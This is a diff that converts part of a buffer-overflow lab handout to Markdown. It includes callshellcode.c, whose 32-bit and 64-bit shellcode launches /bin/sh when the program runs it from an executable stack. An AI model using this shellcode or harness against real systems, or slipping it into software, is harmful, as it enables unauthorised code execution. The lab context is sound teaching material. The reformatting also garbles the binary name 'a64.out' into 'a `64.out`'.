@@ -129,44 +129,37 @@ syscall
 
 ### 3.4 Task: Invoking the Shellcode
 
-We have generated the binary code from the assembly code above, and put the code in a C program called
-callshellcode.cinside theshellcodefolder. If you would like to learn how to generate the binary
-code yourself, you should work on the Shellcode lab. In this task, we will test the shellcode.
+We have generated the binary code from the assembly code above, and put the code in a C program called `callshellcode.c` inside the `shellcode` folder. If you would like to learn how to generate the binary code yourself, you should work on the Shellcode lab. In this task, we will test the shellcode.
 
-Listing 1:callshellcode.c
+**Listing 1:** callshellcode.c
+```
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 
 const char shellcode[] =
 #if __x86_64__
-"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
-"\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
-"\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
 #else
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
-"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
-"\xd2\x31\xc0\xb0\x0b\xcd\x80"
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
 #endif
 ;
 
 int main(int argc, char **argv)
 {
-char code[500];
+    char code[500];
 
-strcpy(code, shellcode); // Copy the shellcode to the stack
-int (*func)() = (int(*)())code;
-func(); // Invoke the shellcode from the stack
-return 1;
+    strcpy(code, shellcode); // Copy the shellcode to the stack
+    int (*func)() = (int(*)())code;
+    func(); // Invoke the shellcode from the stack
+    return 1;
 }
-
-The code above includes two copies of shellcode, one is 32-bit and the other is 64-bit. When we compile
-the program using the-m32flag, the 32-bit version will be used; without this flag, the 64-bit version will
-be used. Using the providedMakefile, you can compile the code by typingmake. Two binaries will be
-created,a32.out(32-bit) anda64.out(64-bit). Run them and describe your observations. It should be
-noted that the compilation uses theexecstackoption, which allows code to be executed from the stack;
-without this option, the program will fail.
-
+```
+The code above includes two copies of shellcode, one is 32-bit and the other is 64-bit. When we compile the program using the `-m32` flag, the 32-bit version will be used; without this flag, the 64-bit version will be used. Using the provided `Makefile`, you can compile the code by typing `make`. Two binaries will be created, `a32.out` (32-bit) and a `64.out` (64-bit). Run them and describe your observations. It should be noted that the compilation uses the `execstack` option, which allows code to be executed from the stack; without this option, the program will fail.
 
 ## 4 Task 2: Understanding the Vulnerable Program
 
